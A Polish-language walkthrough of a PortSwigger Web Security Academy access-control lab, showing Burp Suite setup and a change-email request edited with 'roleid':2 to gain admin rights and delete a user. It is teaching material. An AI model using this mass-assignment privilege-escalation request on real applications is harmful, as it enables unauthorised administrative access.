# User role can be modified in user profile

Link: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

![user role can be modified in user profile](https://dsc.cloud/f62499/pb-T48srxTYoU.png)

Klikamy "Access the lab", ukazuje nam się sklep internetowy z możliwością logowania w zakładce "My account". Używamy danych do logowania z treści zadania.

![user role can be modified in user profile login panel](https://dsc.cloud/f62499/pb-cHkWJkDgVh.png)


Aby utrzymać porządek, dodam stronę wybierając "Add to scope":

![my-account add to scope](https://dsc.cloud/f62499/pb-7jj1llvvHA.png)


Następnie przechodzę do zakładki "Target" > "Scope settings":

![target > scope settings](https://dsc.cloud/f62499/pb-d3SSvCSLmA.png)


Zaznaczam i edytuję stronę w kolumnie "Prefix". Przed edycją:

![edit prefix for in-scope URLs](https://dsc.cloud/f62499/pb-eXCTbtC0Hp.png)


Po edycji:

![edit prefix for in-scope URLs after editing](https://dsc.cloud/f62499/pb-o86YYUMWRs.png)

Klikam "**OK**", aby zatwierdzić.



Wracam do zakładki "Proxy", klikam na "Filter settings: Hiding CSS, image and general binary content":

![filter settings](https://dsc.cloud/f62499/pb-Et5oEuNe27.png)



Zaznaczam opcję: "**Show only in-scope items**":

![show only in-scope items](https://dsc.cloud/f62499/pb-Nj5nXxMPAe.png)

Przechodzimy do aplikacji, jeśli jesteśmy zalogowani i mamy podłączonego Burpa w tle, zmieniamy maila naszemu użytkownikowi:

![change the mail of a user](https://dsc.cloud/f62499/pb-MNikaxFoK2.png)

Po wciśnięciu "Update mail", widzimy żądanie POST na endpoint /my-account/change-email:

![post request change email](https://dsc.cloud/f62499/pb-R15YiuepYM.png)


W zakładce "Proxy" > "HTTP history" możemy zobaczyć response, a w nim: nadmiarowe informacje. Na przykład nasze roleid:

![roleid response](https://dsc.cloud/f62499/pb-P5sPpchBlA.png)

Jak można wykorzystać tę informację, skoro roleid = 2 to konto administratora?

Klikamy prawym przyciskiem myszy na request w historii i wysyłamy do "Repeatera" - może być też skrót klawiszowy control + command + r:

![send request to repeater](https://dsc.cloud/f62499/pb-QPW4elQ9Cj.png)



Gdy przejdziemy do zakładki "Repeater", wysyłamy zmienione żądanie - dopisujemy roleid, które jest równe 2:

```
POST /my-account/change-email HTTP/2
Host: 0a0900500486a9868b57a9cc0000007f.web-security-academy.net
Cookie: session=Ko7Z7Au4McuM6VcbkHrcGPwB8bVUcLHC
Content-Length: 31
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "macOS"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://0a0900500486a9868b57a9cc0000007f.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0900500486a9868b57a9cc0000007f.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

{
	"email":"wiener@new-user.net",
	"roleid":2
}
```



Co widzimy w responsie? Roleid równe 2:

![roleid = 2](https://dsc.cloud/f62499/pb-k0qSBKXVnL.png)




Sprawdzamy zatem co jest w aplikacji (odświeżamy stronę):
![admin panel](https://dsc.cloud/f62499/pb-KkG1FWaqzm.png)


Przechodzimy do admin panelu, usuwamy użytkownika carlos:
![no more carlos](https://dsc.cloud/f62499/pb-NVhK0K3s3V.png)

Lab zakończony:

![user role can be modified in user profile solved lab](https://dsc.cloud/f62499/pb-Zi0giLbzQl.png)

